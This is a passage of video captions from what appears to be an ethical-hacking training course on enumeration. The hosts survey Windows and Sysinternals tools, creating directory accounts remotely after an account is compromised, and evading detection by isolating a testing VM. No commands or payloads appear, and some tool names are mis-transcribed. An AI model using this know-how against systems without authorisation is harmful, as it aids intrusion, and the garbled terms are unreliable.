underestimate any of\nthese tools that we have access to,\n\n394\n00:17:38.407 --> 00:17:40.714\nthat are just bedrock in\nour operating system,\n\n395\n00:17:40.714 --> 00:17:43.440\nthat also can be valuable\nwith regards to enumeration.\n\n396\n00:17:43.440 --> 00:17:48.206\nSomething as simple as a command line\ntool like NetBIOS, base for Nbtstat or\n\n397\n00:17:48.206 --> 00:17:51.570\nnetstat to look at open connections,\ncan be valuable.\n\n398\n00:17:51.570 --> 00:17:55.940\nOften times when I go out and I do pen\ntesting, a lot of times when I am,\n\n399\n00:17:55.940 --> 00:18:00.460\nyou're trolling around out there looking\nat boxes, doing footprinting, doing recon.\n\n400\n00:18:00.460 --> 00:18:04.021\nI will run a scanning system\non the back-end, looking and\n\n401\n00:18:04.021 --> 00:18:07.350\nseeing what is inbound in my\nmachine to see if I've been found.\n\n402\n00:18:07.350 --> 00:18:10.120\nAnd I wanna see active connections\nthat are coming out in me.\n\n403\n00:18:10.120 --> 00:18:13.320\nSo I will run an active scanner\non my system, looking for\n\n404\n00:18:13.320 --> 00:18:15.460\ninbound traffic as I am going outbound.\n\n405\n00:18:15.460 --> 00:18:19.380\nTrying to see if anybody has found me,\nand then I will be watching for that.\n\n406\n00:18:19.380 --> 00:18:22.523\nAnd what I will typically do is\nrun the hacking information and\n\n407\n00:18:22.523 --> 00:18:26.390\nall the tools out of VMs, and\nI'll run the scan on the host machine.\n\n408\n00:18:26.390 --> 00:18:27.370\nAnd as a result of that,\n\n409\n00:18:27.370 --> 00:18:31.460\nI can actually see the inbound traffic\nin real time before it gets to the VM.\n\n410\n00:18:31.460 --> 00:18:34.800\nAnd if it looks like I've been caught,\nI could just simply isolate the VM by\n\n411\n00:18:34.800 --> 00:18:37.728\ncutting off the adapter, and\nnobody can see it, right?\n\n412\n00:18:37.728 --> 00:18:40.880\nSo, I have capabilities to do\na lot of this kind of stuff,\n\n413\n00:18:40.880 --> 00:18:44.200\ndepending on the kind of\nenumeration I'm looking to do.\n\n414\n00:18:44.200 --> 00:18:46.470\nThere's a lot of different\nenumeration tools out there.\n\n415\n00:18:46.470 --> 00:18:49.460\nWe mentioned SuperScan as a tool\nthat would be valuable and\n\n416\n00:18:49.460 --> 00:18:50.775\nthat you could take a look at.\n\n417\n00:18:50.775 --> 00:18:54.110\nWe'll take a look at that, and look at\nthat in one of our demo labs a little\n\n418\n00:18:54.110 --> 00:18:55.810\nlater on, it's an oldie but a goody.\n\n419\n00:18:55.810 --> 00:18:57.602\nComes from Foundstone,\n\n420\n00:18:57.602 --> 00:19:03.630\nwhich is an old corporation entity that\nput out a lot of very, very robust tools.\n\n421\n00:19:03.630 --> 00:19:05.346\nThey got bought up several years ago,\n\n422\n00:19:05.346 --> 00:19:08.358\nthey're owned by Microsoft now\nthrough Winternals, I believe.\n\n423\n00:19:08.358 --> 00:19:10.394\n>> Yeah, or\nMcAfee might have won that one.\n\n424\n00:19:10.394 --> 00:19:12.029\n>> Or might own them now, I don't know.\n\n425\n00:19:12.029 --> 00:19:14.295\nAt one point,\nI think Microsoft had acquired them,\n\n426\n00:19:14.295 --> 00:19:17.610\nbecause they were part of the Sysinternals\nwhen Internals acquisitioned.\n\n427\n00:19:17.610 --> 00:19:20.110\nBut I could be wrong,\nit may not be them now.\n\n428\n00:19:20.110 --> 00:19:22.810\nWe'll talk about Hyena,\nanother great tool that we can use.\n\n429\n00:19:22.810 --> 00:19:26.060\nThat's the one I talked about, we can\ngo out remotely control, connect to,\n\n430\n00:19:26.060 --> 00:19:29.212\nand through enumeration, create user\naccounts in the old app directory,\n\n431\n00:19:29.212 --> 00:19:30.477\nand do a bunch of other stuff.\n\n432\n00:19:30.477 --> 00:19:33.157\nI'll do a live demo on that\none in the lab segment.\n\n433\n00:19:33.157 --> 00:19:35.364\nPretty cool,\nwhere you see me create the account.\n\n434\n00:19:35.364 --> 00:19:36.620\nWe go into it and say yeah look at that-\n>> [LAUGH]\n\n435\n00:19:36.620 --> 00:19:38.074\n>> There's the account right there,\n\n436\n00:19:38.074 --> 00:19:39.330\nsure enough, right?\n\n437\n00:19:39.330 --> 00:19:41.860\nNow obviously you have to have rights\nto the old app directory to be able\n\n438\n00:19:41.860 --> 00:19:42.660\nto do that.\n\n439\n00:19:42.660 --> 00:19:46.010\nSo a hacker would have to first,\nsomehow compromise an account.\n\n440\n00:19:46.010 --> 00:19:47.530\nBut you'd be surprised, as I talked about,\n\n441\n00:19:47.530 --> 00:19:50.460\nhow it is not that hard to\nfind an account today, right?\n\n442\n00:19:50.460 --> 00:19:53.950\nTools like WinFingerprint would\nbe another good enumeration tool.\n\n443\n00:19:53.950 --> 00:19:57.224\nThere is the Nsauditor, or\nthe network security auditor tool,\n\n444\n00:19:57.224 --> 00:19:58.445\nthat we may use as well.\n\n445\n00:19:58.445 --> 00:20:02.485\nThere's a lot of different ones out there\nfor all sorts of enumeration capabilities.\n\n446\n00:20:02.485 --> 00:20:06.156\nSo enumerating a lot of these, and\ndon't forget command line tools.\n\n447\n00:20:06.156 --> 00:20:10.616\nThere's that whole list of tools that\nwe have, again, from the Sysinternals\n\n448\n00:20:10.616 --> 00:20:15.292\nacquisition, that Microsoft has now,\nPsList, and a lot of those kind of tools.\n\n449\n00:20:15.292 --> 00:20:19.460\nPsPasswd, PsLogList,\nPsGetsid, PsFile, PsExec,\n\n450\n00:20:19.460 --> 00:20:22.217\nthese are all tools in that tool set.\n\n451\n00:20:22.217 --> 00:20:25.073\nCan you actually, while we're talking,\ncan you go to TechNet and\n\n452\n00:20:25.073 --> 00:20:26.809\njust look up the Sysinternals tool set?\n\n453\n00:20:26.809 --> 00:20:29.090\nAnd just so that way,\nwe can show everybody, when you're ready,\n\n454\n00:20:29.090 --> 00:20:29.719\nhow to find that.\n\n455\n00:20:29.719 --> 00:20:32.995\nGreat set of tools, by the way,\nPsKill, PsInfo, PsShutdown.\n\n456\n00:20:32.995 --> 00:20:36.739\nThere's like, 10, 15 different tools in\nthat tool set that could be used from\n\n457\n00:20:36.739 --> 00:20:37.990\na command line in Windows.\n\n458\n00:20:37.990 --> 00:20:41.137\nA lot of them have graphical interfaces\nas well, that could be used on\n\n459\n00:20:41.137 --> 00:20:44.523\nWindows Infrastructure to do a bunch\nof enumeration and various things.\n\n460\n00:20:44.523 --> 00:20:47.177\nSo the Windows Sysinternals\ntools set at Microsoft.\n\n461\n00:20:47.177 --> 00:20:49.940\nMicrosoft went out and bought the company,\nI don't know, it's probably seven or\n\n462\n00:20:49.940 --> 00:20:51.176\neight years ago now, if not longer.\n\n463\n00:20:51.176 --> 00:20:52.653\n>> Yeah, I think, yep.\n\n464\n00:20:52.653 --> 00:20:54.874\n>> And\nthey are just making them available.\n\n465\n00:20:54.874 --> 00:20:58.052\nMark Russinovich,\nwho was one of the key principles,\n\n466\n00:20:58.052 --> 00:21:01.937\nis like a huge guru at Microsoft,\nand rightly so, brilliant guy.\n\n467\n00:21:01.937 --> 00:21:05.597\nAnd they've got all these tools out there,\nso you can download it, and\n\n468\n00:21:05.597 --> 00:21:07.122\nthen you can run those tools.\n\n469\n00:21:07.122 --> 00:21:08.409\n>> And that's a pretty extensive list.\n\n470\n00:21:08.409 --> 00:21:11.584\n>> Yeah there's a whole bunch,\nI just named off maybe ten of them, but\n\n471\n00:21:11.584 --> 00:21:13.270\nthere's a bunch of stuff in there.\n\n472\n00:21:13.270 --> 00:21:16.124\nTCPView, WinDump,\nall sorts of stuff is in there, so\n\n473\n00:21:16.124 --> 00:21:17.996\na lot of really good tools, right?\n\n474\n00:21:17.996 --> 00:21:21.824\nSo something definitely to take a look at,\nsomething for you to be aware of, just to\n\n475\n00:21:21.824 --> 00:21:25.184\nsee the kinda stuff that you may want\nto be able to play with at some point.\n\n476\n00:21:25.184 --> 00:21:27.960\nThere's utilities like NetView,\nwhich is a command line tool.\n\n477\n00:21:27.960 --> 00:21:31.164\nLet's us go out and connect to a machine,\nenumerate what's there so\n\n478\n00:21:31.164 --> 00:21:32.740\nwe could see what's going on.\n\n479\n00:21:32.740 --> 00:21:35.889\nYeah, all sorts of things that we\nmay wanna take advantage of and or\n\n480\n00:21:35.889 --> 00:21:37.000\ntake a look at.\n\n481\n00:21:37.000 --> 00:21:40.370\nWhen we think about enumeration, what\nwe're actually thinking about ultimately,\n\n482\n00:21:40.370 --> 00:21:44.480\nas we said, is the ability to go out and\nto essentially list and\n\n483\n00:21:44.480 --> 00:21:45.810\nfind what is running there.\n\n484\n00:21:45.810 --> 00:21:49.150\nAnd it's really important that\nas certified ethical hackers,\n\n485\n00:21:49.150 --> 00:21:53.080\nas essentially admins in a network,\nor security professionals,\n\n486\n00:21:53.080 --> 00:21:57.220\nwhatever you want to call yourself,\nthat we think about what we, and\n\n487\n00:21:57.220 --> 00:21:59.540\nwe've talked about this,\nwhat we advertise all the time.\n\n488\n00:21:59.540 --> 00:22:01.068\nWhat we give away, in other words, right?\n\n489\n00:22:01.068 --> 00:22:06.200\nAnd we may not realize, I showed you just\nquickly in the quick demo we did about\n\n490\n00:22:06.200 --> 00:22:08.040\nusing Nbtstat and netstat.\n\n491\n00:22:08.040 --> 00:22:10.900\nThere was nothing in the NetBIOS cache,\ncuz we had not connected.\n\n492\n00:22:10.900 --> 00:22:14.010\nBut in the netstat command,\nwhere we looked at the adapter cache,\n\n493\n00:22:14.010 --> 00:22:16.290\nwe saw there's a bunch\nof active connections.\n\n494\n00:22:16.290 --> 00:22:19.420\nAnd we may not realize we had all those\nSkype connections up and running.\n\n495\n00:22:19.420 --> 00:22:22.670\nI'm looking at the box right now in real\ntime, and I see Skype on the desktop,\n\n496\n00:22:22.670 --> 00:22:24.610\nbut I don't see it running\ncuz it's minimized.\n\n497\n00:22:24.610 --> 00:22:28.000\nI may not know it's there, yet it's\nrunning behind the scenes as a service.\n\n498\n00:22:28.000 --> 00:22:29.700\nNow this brings up an interesting point,\nright?\n\n499\n00:22:29.700 --> 00:22:32.795\nWe can go to task manager,\nand we can take a look, and\n\n500\n00:22:32.795 --> 00:22:34.505\ncan we go back to the lab box for\njust a minute?\n\n501\n00:22:34.505 --> 00:22:37.895\nCan we come back over here,\nand just do a full screen.\n\n502\n00:22:37.895 --> 00:22:39.295\nSo we can go ahead, right?\n\n503\n00:22:40.565 --> 00:22:43.691\nWe could do a Ctrl+Alt+Delete,\nnot hard to do, do Task Manager.\n\n504\n00:22:43.691 --> 00:22:45.365\nThis is Windows 10, by the way, so\n\n505\n00:22:45.365 --> 00:22:47.509\nwe've got the funky new task manager-\n>> [LAUGH]\n\n506\n00:22:47.509 --> 00:22:48.747\n>> That previews in Windows 8.\n\n507\n00:22:48.747 --> 00:22:50.892\nNo, I want to see no\ninformation when I start,\n\n508\n00:22:50.892 --> 00:22:52.804\nI wanna have to click on a button-\n>> [LAUGH]\n\n509\n00:22:52.804 --> 00:22:54.438\n>> That says show me what I actually came\n\n510\n00:22:54.438 --> 00:22:55.024\nhere to see.\n\n511\n00:22:55.024 --> 00:22:58.991\nYeah, that's a brilliant way to architect\na tool, let me tell you what, right?\n\n512\n00:22:58.991 --> 00:23:02.358\nYou have the old style of Task Manager\nwhen I hit Ctrl+Alt+Delete.\n\n513\n00:23:02.358 --> 00:23:05.877\nAnd although the operating system may not\nbe as great as Windows 8 or Windows 10,\n\n514\n00:23:05.877 --> 00:23:08.306\nbut it actually shows me what\nI want right out of the gate.\n\n515\n00:23:08.306 --> 00:23:09.777\n>> [LAUGH]\n>> I'm just a purist, and\n\n516\n00:23:09.777 --> 00:23:11.834\nmaybe I'm being a little silly,\nbut guess what?\n\n517\n00:23:11.834 --> 00:23:14.325\nThat actually is what I want to see,\nthat's what I came for.\n\n518\n00:23:14.325 --> 00:23:15.773\n>> [LAUGH]\n>> So, I may wanna actually just\n\n519\n00:23:15.773 --> 00:23:16.668\nsee that, right?\n\n520\n00:23:16.668 --> 00:23:19.491\nBut I'm being just silly and\nstupid, and of course,\n\n521\n00:23:19.491 --> 00:23:21.954\nas always, being vicious for\nno good reason.\n\n522\n00:23:21.954 --> 00:23:22.454\n[LAUGH]\n>> [LAUGH]\n\n523\n00:23:22.454 --> 00:23:22.954\n>> Right?\n\n524\n00:23:22.954 --> 00:23:24.296\nBut what you can see here,\n\n525\n00:23:24.296 --> 00:23:28.756\nwith Task Manager, is we have obviously\nrunning applications, running processes,\n\n526\n00:23:28.756 --> 00:23:30.904\nright?\nAll the different things, and\n\n527\n00:23:30.904 --> 00:23:34.255\nwe can see app history, which is nice.\nIf we have apps running,\n\n528\n00:23:34.255 --> 00:23:37.099\nwe can see what they are.\nThat's new to 10, so that's nice,\n\n529\n00:23:37.099 --> 00:23:39.135\nyou don't see that in some\nof the prior versions.\n\n530\n00:23:39.135 --> 00:23:42.247\nBut I do have process here, and\nI can see them grouped, right?\n\n531\n00:23:42.247 --> 00:23:46.696\nBut is it fair to say, and let me just\ntake a quick look, we got a total of 33\n\n532\n00:23:46.696 --> 00:23:51.871\nbackground processes, 3 apps running in\nthe foreground, including Task Manager.\n\n533\n00:23:51.871 --> 00:23:54.483\nIs it fair to say that that\nrepresents every application and\n\n534\n00:23:54.483 --> 00:23:55.587\nevery process running?\n\n535\n00:23:55.587 --> 00:23:56.576\nOn our system?\n\n536\n00:23:56.576 --> 00:23:58.728\n>> Absolutely, Microsoft-\n>> Would we be accurate to say that?\n\n537\n00:23:58.728 --> 00:24:02.100\n>> Microsoft would not\nhide any of that from us.\n\n538\n00:24:02.100 --> 00:24:05.230\nMicrosoft is a very trusting soul,\nit's why we love him so much, and\n\n539\n00:24:05.230 --> 00:24:07.452\nwhy we don't let him go out\nin public without a minder.\n\n540\n00:24:07.452 --> 00:24:09.637\n>> [LAUGH]\n>> So you'll unfortunately, and\n\n541\n00:24:09.637 --> 00:24:13.703\nI know Mike is saying that tongue in\ncheek, we do unfortunately have quite\n\n542\n00:24:13.703 --> 00:24:17.030\na number of hidden services\npotentially that are there.\n\n543\n00:24:17.030 --> 00:24:20.920\nWe just talked about some of the Windows\nsysinternals tools that could be used and\n\n544\n00:24:20.920 --> 00:24:24.110\nthe Winternal tool set has a tool\nspecifically that would actually show us\n\n545\n00:24:24.110 --> 00:24:25.770\nall of the processes that are running.\n\n546\n00:24:25.770 --> 00:24:29.060\nPslist will actually do that for\nus, so would top or proc or\n\n547\n00:24:29.060 --> 00:24:30.580\nlist in a Linux system.\n\n548\n00:24:30.580 --> 00:24:32.215\nRight, essentially same kind of tools.\n\n549\n00:24:32.215 --> 00:24:36.240\nPsList is just a Windows port of the list,\nor the proc, or the top tool.\n\n550\n00:24:36.240 --> 00:24:37.680\nAnd we would run that and\n\n551\n00:24:37.680 --> 00:24:40.520\nget a very different picture of\nwhat's actually going on here.\n\n552\n00:24:40.520 --> 00:24:42.830\nAnd so, when we're thinking\nabout enumeration, right?\n\n553\n00:24:42.830 --> 00:24:44.710\nWe want to think about the fact, right?\n\n554\n00:24:44.710 --> 00:24:48.730\nWe want to think about the fact\nthat we should be a little bit,\n\n555\n00:24:48.730 --> 00:24:50.770\nwhat do I wanna say?\n\n556\n00:24:50.770 --> 00:24:55.470\nWe should be a little bit,\nhelp me here [LAUGH].\n\n557\n00:24:55.470 --> 00:24:56.860\n>> I don't see what you're\ntrying to say here.\n\n558\n00:24:56.860 --> 00:24:59.855\n>> We wanna be a little bit skeptical\nis the word I'm looking for, right?\n\n559\n00:24:59.855 --> 00:25:01.600\n>> [LAUGH]\n>> Three syllables, sounds like,\n\n560\n00:25:01.600 --> 00:25:02.550\nfirst word, right?\n\n561\n00:25:02.550 --> 00:25:04.620\n>> [LAUGH]\n>> So we want almost skeptical here.\n\n562\n00:25:04.620 --> 00:25:08.180\nIt's the end of the day folks, I'm sorry,\njust there's a limit to what I can do\n\n563\n00:25:08.180 --> 00:25:10.730\njust off the top of my head\nas we ad lib along the way.\n\n564\n00:25:10.730 --> 00:25:14.210\nSometimes I lose my train of thought and\nwe have to get back on track.\n\n565\n00:25:14.210 --> 00:25:16.100\nSo with regard to being skeptical here,\n\n566\n00:25:16.100 --> 00:25:20.410\nmy point was that there's a lot of stuff\nthat may be going on, on any system,\n\n567\n00:25:20.410 --> 00:25:23.610\nlet alone one you're targeting or\none you're using, or anything in between.\n\n568\n00:25:23.610 --> 00:25:26.360\nThat you may not actually see\nit unless you know it's there,\n\n569\n00:25:26.360 --> 00:25:27.820\nyou may have no point of reference for it.\n\n570\n00:25:27.820 --> 00:25:32.339\nSo, we wanna understand that numeration's\nas much about knowing what is there and\n\n571\n00:25:32.339 --> 00:25:35.574\nseeing the obvious as it is\nabout anticipating what is not.\n\n572\n00:25:35.574 --> 00:25:37.953\nAnd zeroing in things\nthat are not obvious, but\n\n573\n00:25:37.953 --> 00:25:40.990\nmay actually still will be running and\nmay be there.\n\n574\n00:25:40.990 --> 00:25:45.210\nAnd using a combination of this\ntools is gonna be very valuable\n\n575\n00:25:45.210 --> 00:25:47.110\nto help us to get there and\nunderstand that.\n\n576\n00:25:47.110 --> 00:25:50.240\nAnd it becomes very important\nbecause if I just went by what I see\n\n577\n00:25:50.240 --> 00:25:53.980\nin a command line editor or\na command line tool like task manager,\n\n578\n00:25:53.980 --> 00:25:56.890\nI would be missing potentially malware and\nall sorts of stuff that\n\n579\n00:25:56.890 --> 00:25:59.760\ncould be running under the hood\nthat I may not know is there.\n\n580\n00:25:59.760 --> 00:26:03.510\nSpecifically because the people that put\nit there, set it up so that it doesn't\n\n581\n00:26:03.510 --> 00:26:08.130\nsay hey, I'm alive, and announce its\npresence to the Task Manager because it\n\n582\n00:26:08.130 --> 00:26:11.860\nwants to run in stealth mode, specifically\nto hide and be under the radar.\n\n583\n00:26:11.860 --> 00:26:15.014\nAnd this is one of the things we have to\nthink about as we get out of the mindset\n\n584\n00:26:15.014 --> 00:26:17.236\nand get a little bit broader\nthan just enumeration.\n\n585\n00:26:17.236 --> 00:26:20.793\nBut rather look at now, how do we\nunderstand what's going on in a system\n\n586\n00:26:20.793 --> 00:26:24.708\nfrom a baselining perspective and how do\nwe apply some of our skills that we're\n\n587\n00:26:24.708 --> 00:26:27.109\ntalking about here to\nprotecting our systems?\n\n588\n00:26:27.109 --> 00:26:30.017\nBecause we have to understand what's\nrunning there as a baseline to know\n\n589\n00:26:30.017 --> 00:26:32.030\nwhether or not there's been a compromise.\n\n590\n00:26:32.030 --> 00:26:35.930\nAnd if we allow software to run that\nisn't exposed in the Task Manager,\n\n591\n00:26:35.930 --> 00:26:38.840\nwe don't monitor, we don't see,\nwe may have a problem.\n\n592\n00:26:38.840 --> 00:26:41.890\nIt's not to say that we don't let it run\nbecause it may run without our knowledge.\n\n593\n00:26:41.890 --> 00:26:44.660\nBut we have to be able to scan for\nand find those things.\n\n594\n00:26:44.660 --> 00:26:49.451\nTools like HiJackThis, PsList, all sorts\nof tools that will go to the kernel and\n\n595\n00:26:49.451 --> 00:26:53.325\nessentially find all running processes and\npull process ID's,\n\n596\n00:26:53.325 --> 00:26:55.593\nwhat we call PIDs, and display them.\n\n597\n00:26:55.593 --> 00:26:58.994\nEven though they're not the flag\non that process string, or\n\n598\n00:26:58.994 --> 00:27:02.396\nthat process tree has not been\nset to show in graphical view or\n\n599\n00:27:02.396 --> 00:27:06.450\nshow in Task Manager, we can still\nprofile it with the proper tools.\n\n600\n00:27:06.450 --> 00:27:08.660\nBut we do want to be aware of that,\nthat's part of what we talk about and\n\n601\n00:27:08.660 --> 00:27:10.760\ndeal with regards to enumeration.\n\n602\n00:27:10.760 --> 00:27:11.650\n>> All right, Adam.\n\n603\n00:27:11.650 --> 00:27:14.380\nAgain, a great look there at enumeration.\n\n604\n00:27:14.380 --> 00:27:17.100\nWe're getting to phase three\nof our attack life cycle.\n\n605\n00:27:17.100 --> 00:27:19.220\nStarting to list things out,\nstarting to reach out and\n\n606\n00:27:19.220 --> 00:27:22.370\ninteract with that system,\ntrying to determine what's there.\n\n607\n00:27:22.370 --> 00:27:27.070\nAnd again, as Adam said, maybe what's\nnot there, what should be there.\n\n608\n00:27:27.070 --> 00:27:28.000\nSo we appreciate that.\n\n609\n00:27:28.000 --> 00:27:30.040\nThank you for\nthose great demonstrations, Adam.\n\n610\n00:27:30.040 --> 00:27:31.660\nHope everybody out there enjoyed watching.\n\n611\n00:27:31.660 --> 00:27:34.320\nSigning off for ITProTV, I'm Mike Rodrick.\n\n612\n00:27:34.320 --> 00:27:35.500\n>> I'm a ghost in the machine.\n\n613\n00:27:35.500 --> 00:27:37.145\nHere I am, now I'm not.\n\n614\n00:27:37.145 --> 00:27:39.660\n>> [LAUGH] And we'll see you,\nor not, next time.\n\n615\n00:27:39.660 --> 00:27:41.877\n>> Take care, everybody.\n\n616\n00:27:41.877 --> 00:27:49.490\n[MUSIC]\n\n",

at ITProTV.\n\n4\n00:00:16.080 --> 00:00:17.540\nI'm your host Mike Roderick, and\n\n5\n00:00:17.540 --> 00:00:20.630\ntoday we're doing certified\nethical hacker version nine.\n\n6\n00:00:20.630 --> 00:00:23.190\nAnd specifically in this episode\n\n7\n00:00:23.190 --> 00:00:25.630\nwe're actually continuing\nalong with enumeration, right.\n\n8\n00:00:25.630 --> 00:00:29.292\nWe're getting to that phase three of\nthe attack lifecycle, we looked at\n\n9\n00:00:29.292 --> 00:00:33.015\nfootprinting, we looked scanning,\nwe also talked about enumeration,\n\n10\n00:00:33.015 --> 00:00:35.497\nexplained what it was,\nwhat we expect out of it.\n\n11\n00:00:35.497 --> 00:00:38.890\nNow we're gonna take a look at\nactually performing some enumeration.\n\n12\n00:00:38.890 --> 00:00:40.888\nAnd here to do that for\nus is Mr. Adam Gordon.\n\n13\n00:00:40.888 --> 00:00:41.465\nHow are you doing, Adam?\n\n14\n00:00:41.465 --> 00:00:42.691\n>> I am good.\n\n15\n00:00:42.691 --> 00:00:45.404\nI am feeling like a long drawn out list.\n\n16\n00:00:45.404 --> 00:00:47.566\n>> [LAUGH] You feeling enumerated?\n\n17\n00:00:47.566 --> 00:00:49.170\n>> I'm feeling enumerated.\n\n18\n00:00:49.170 --> 00:00:52.210\nAlthough after all that espresso I've had,\nI don't know if enumeration is the right\n\n19\n00:00:52.210 --> 00:00:56.060\nterm for what I'm feeling, but [LAUGH]\n[LAUGH] We're gonna work through it here\n\n20\n00:00:56.060 --> 00:00:59.980\nas we always do at ITProTV\nbecause we're here for you.\n\n21\n00:00:59.980 --> 00:01:00.673\nThat's what's important.\n>> That's right.\n\n22\n00:01:00.673 --> 00:01:01.811\n[LAUGH]\n>> So,\n\n23\n00:01:01.811 --> 00:01:03.710\nwe're gonna talk a little\nbit about enumeration.\n\n24\n00:01:03.710 --> 00:01:06.340\nWe're actually gonna do a little show and\ntell here in a minute, and as we always\n\n25\n00:01:06.340 --> 00:01:09.640\ndo, we just wanna give you a sense of what\nwe're about to go in and take a look at.\n\n26\n00:01:09.640 --> 00:01:14.010\nWe're going to, as Mike said, set up and\ndo some exercises, some demonstrations\n\n27\n00:01:14.010 --> 00:01:18.320\nusing some tools that would commonly\nbe in the CEH toolkit for enumeration.\n\n28\n00:01:18.320 --> 00:01:22.070\nWe'll take a look at tool called\ncurrports, current ports, what's up and\n\n29\n00:01:22.070 --> 00:01:25.485\nrunning, so we can kind of profile a box,\nsee what's going on there.\n\n30\n00:01:25.485 --> 00:01:28.315\nWe'll take a look at\nSuperScam an oldie but\n\n31\n00:01:28.315 --> 00:01:30.785\na goodie from Foundstone\nas we talked about before.\n\n32\n00:01:30.785 --> 00:01:32.995\nI'll have three or\nfour accusations, right, but\n\n33\n00:01:32.995 --> 00:01:35.435\nit is now I think we said\nMcAfee now ultimately owns it.\n\n34\n00:01:35.435 --> 00:01:37.492\nSo we'll take a look at that tool,\ntools been around for\n\n35\n00:01:37.492 --> 00:01:40.142\nawhile to let us go out and\nscan a port range or\n\n36\n00:01:40.142 --> 00:01:43.482\nscan an IP range rather looking for\nports and we'll take a look at that.\n\n37\n00:01:43.482 --> 00:01:46.922\nWe'll take a look at Swiss Army Knife\nkind of tool called MegaPing which\n\n38\n00:01:46.922 --> 00:01:49.427\ndoes a lot of thing we've talked\nabout with other tools but\n\n39\n00:01:49.427 --> 00:01:55.096\nwill also allow us to get a lot of\nthe enumeration information we want.\n\n40\n00:01:55.096 --> 00:02:00.166\nIt'll show us shares and\nbios information, IP ranges, open ports,\n\n41\n00:02:00.166 --> 00:02:04.170\nit'll give us settings and all sorts of\nthings and we'll kinda walk through there.\n\n42\n00:02:04.170 --> 00:02:08.990\nWe'll also take a look at Hyena,\na tool that allows us to go in and\n\n43\n00:02:08.990 --> 00:02:11.260\nto connect to an LDAP directory.\n\n44\n00:02:11.260 --> 00:02:14.260\nIn other words, something that is running,\ntraditionally in Microsoft active\n\n45\n00:02:14.260 --> 00:02:17.480\ndirectory or\nan openLDAP solution somewhere.\n\n46\n00:02:17.480 --> 00:02:20.765\nAnd if we have the appropriate rights, and\nremember that you doing the footprinting\n\n47\n00:02:20.765 --> 00:02:23.958\nand reconnaissance and doing the gathering\nof information that we talked about in\n\n48\n00:02:23.958 --> 00:02:26.428\nsome of the prior episodes may\nenable us to find user accounts.\n\n49\n00:02:26.428 --> 00:02:31.283\nMay enable us to be able to trip\nover information that would\n\n50\n00:02:31.283 --> 00:02:34.420\nallow us to use a tool like this.\n\n51\n00:02:34.420 --> 00:02:38.003\nOr enumeration itself in this phase\nmay actually allow us to find this\n\n52\n00:02:38.003 --> 00:02:39.140\ninformation.\n\n53\n00:02:39.140 --> 00:02:43.580\nWe may then push a tool like Hyena forward\ninto one of the other phases to then\n\n54\n00:02:43.580 --> 00:02:46.110\nactively use it as we\nare engaging the machine.\n\n55\n00:02:46.110 --> 00:02:49.580\nAnd we'll just jump into it here to show\nyou a little bit about what this tool\n\n56\n00:02:49.580 --> 00:02:50.400\ncan do.\n\n57\n00:02:50.400 --> 00:02:53.836\nBut I'll use this tool to be able to\ngo in and create user accounts inside\n\n58\n00:02:53.836 --> 00:02:56.777\nthe directory on a domain\ncontroller from a remote machine.\n\n59\n00:02:56.777 --> 00:03:00.101\nThe assumption being that as\nan ethical hacker, I may be looking for\n\n60\n00:03:00.101 --> 00:03:02.610\nweaknesses in that\nparticular defense strategy,\n\n61\n00:03:02.610 --> 00:03:05.665\ndo I have user accounts that\nhave been recently compromised?\n\n62\n00:03:05.665 --> 00:03:09.862\nDo I have monitoring going on that will\nalert me when an account is created out of\n\n63\n00:03:09.862 --> 00:03:13.260\nsync, something that's being\ndone out of normal flow?\n\n64\n00:03:13.260 --> 00:03:16.930\nSo we're gonna look at how easy it is to\ndo that, and then we'll obviously talk\n\n65\n00:03:16.930 --> 00:03:19.620\nabout some of the things we wanted\nto make sure that doesn't happen.\n\n66\n00:03:19.620 --> 00:03:22.060\nSo we're gonna go ahead and we're gonna\ntake a look at how to do all that.\n\n67\n00:03:22.060 --> 00:03:23.580\nIf we can go over to the lab machine,\n\n68\n00:03:23.580 --> 00:03:27.440\nI'm going to [COUGH] drive us\nthrough the Windows 8 machine here.\n\n69\n00:03:27.440 --> 00:03:30.100\nThen Ronald would be flipping back and\nforth between a couple of different\n\n70\n00:03:30.100 --> 00:03:35.370\nmachines, but we will start out on the\nWindows 8.1 desktop here, as you can see.\n\n71\n00:03:35.370 --> 00:03:36.950\nGot a bunch of tools\nthat I've loaded up for\n\n72\n00:03:36.950 --> 00:03:39.640\nthis demo,\ngot shortcuts to them sitting here.\n\n73\n00:03:39.640 --> 00:03:41.076\nWhat we're going to do is start out with,\n\n74\n00:03:41.076 --> 00:03:44.007\nI'm actually going to give Mike the option\nto tell us where we're going to go first.\n\n75\n00:03:44.007 --> 00:03:44.540\nMike, what tool do you want to start with?\n\n76\n00:03:44.540 --> 00:03:45.850\n>> Let's see.\n\n77\n00:03:45.850 --> 00:03:47.910\nYou know I happen to have\nNearsoft's website pulled up.\n\n78\n00:03:47.910 --> 00:03:48.947\nSo how about some currports?\n\n79\n00:03:48.947 --> 00:03:50.580\n>> All right, so let's do currports.\n\n80\n00:03:50.580 --> 00:03:52.480\nWe'll pull that up,\nI already have that running.\n\n81\n00:03:52.480 --> 00:03:54.140\nGive it just a second to come up here.\n\n82\n00:03:54.140 --> 00:03:57.910\nBecause as is the case sometimes, we have\nmultiple tools running on the system.\n\n83\n00:03:57.910 --> 00:04:00.710\nYou know they may run a little slow,\nwe're doing active scanning right now.\n\n84\n00:04:00.710 --> 00:04:03.500\nSo it's going to slow down the system,\nwe're chewing up a lot of memory.\n\n85\n00:04:03.500 --> 00:04:07.040\nA lot of processor cycles, so be patient\nwith us as we bring those tools up,\n\n86\n00:04:07.040 --> 00:04:08.350\nif there is a slight delay.\n\n87\n00:04:08.350 --> 00:04:12.192\nYou can see here, in the currports tool,\nthat we are able to go out and\n\n88\n00:04:12.192 --> 00:04:15.630\nwe are able to see what is\nrunning on the local machines.\n\n89\n00:04:15.630 --> 00:04:18.730\nThis is a tool that will give us\nthe current ports that are available.\n\n90\n00:04:18.730 --> 00:04:22.700\nWe talked in one of our prior episodes\nabout being able to see what was in task\n\n91\n00:04:22.700 --> 00:04:26.390\nmanager, right,\nyour all processes gonna be running there.\n\n92\n00:04:26.390 --> 00:04:28.640\nWe agreed that the reality use no,\n\n93\n00:04:28.640 --> 00:04:31.660\nwhile many processes are going\nto be exposed in task manager.\n\n94\n00:04:31.660 --> 00:04:35.040\nNot all of them are going to be exposed\nnatively in the operating system,\n\n95\n00:04:35.040 --> 00:04:37.280\nas a matter of fact,\nthe lot of them are not going to show up.\n\n96\n00:04:37.280 --> 00:04:40.200\nAnd we talked about where\ntask manager comes from.\n\n97\n00:04:40.200 --> 00:04:44.450\nIt's kind of historical reference back to\na Linux UNIX world where we talk about\n\n98\n00:04:44.450 --> 00:04:48.570\nthings like top, or proc, or list,\nand 